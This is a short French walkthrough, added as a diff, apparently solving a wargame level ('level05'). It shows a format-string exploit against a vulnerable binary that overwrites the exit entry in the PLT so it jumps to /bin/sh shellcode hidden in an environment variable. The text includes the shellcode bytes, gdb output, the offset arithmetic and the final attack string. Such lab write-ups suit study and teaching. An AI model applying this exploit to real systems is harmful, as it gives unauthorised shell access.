@@ -1,0 +1,36 @@
+On décompile le programme, et on voit que l'on peut faire un exploit de format printf. Il va s'agir de réécrire
+l'entrée dans la plt pour exit, afin de la faire pointer vers un shellcode contenu dans une variable 
+d'environnement. On ne peut pas mettre le shellcode dans le buffer car la fonction tolower passe dessus et 
+modifie nos valeurs.
+
+Avec objdump, on trouve l'entrée dans la plt de exit : 0x80497e0
+
+On met un shellcode dans une variable d'environnement
+export SHELLCODE=$(python -c 'print( "\x90"*200 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x89\xe1\xb0\x0b\xcd\x80")')
+On trouve l'adresse de la var d'env avec gdb
+(gdb) x/10s *((char **)environ)
+0xffffd805:      "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
+0xffffd8cd:      "\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\311\061\322Ph//shh/bin\211\343P\211\342\211\341\260\v̀
+
+On choisit une address au milieu de la nopslide : 0xffffd815
+cette adresse est trop longue à écrire dans l'entrée std, donc on la coupe en deux
+
+On met les deux adresses dans lesquelles on veut écrire au début de notre buffer, pour pouvoir y accéder avec le
+format du printf. On les retrouve empiriquement dans le format avec %10x. 
+
+On construit donc la string d'attaque comme suit :
+-l'adresse dans la plt qu'on veut modifier, pour modifier les 2 octets de poid faible : 0x080497e0 (en ordre 
+    inverse)
+-l'adresse dans la plt qu'on veut modifier + 2, pour modifier les 2 octets de poid fort : 0x080497e2 (en ordre 
+    inverse)
+-%[nb]c, avec [nb] qui est la conversion en décimal des 2 octets de poid faible, moins les 8 octets d'adresse
+    déjà écrit, ici 0xd815 -> 55317, %[55317 - 8]c -> %55309c
+-%10$hn, pour écrire les 2 octets à la première adresse donnée
+%[nb]c, avec [nb] qui est la conversion en décimal des 2 octets de poid fort, moins les 8 octets d'adresse
+    déjà écrit, moins le nombre d'octets écrit par le précédent %c, ici 0xffff -> 65535, 
+    %[65535 - 55309 - 8]c -> %10218c
+-%11$hn, pour écrire les 2 octets à la deuxième adresse donnée
+
+string d'attaque :
+python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55309c" + "%10$hn" + "%10218c" + "%11$hn")' > test
+cat test - | ./level05
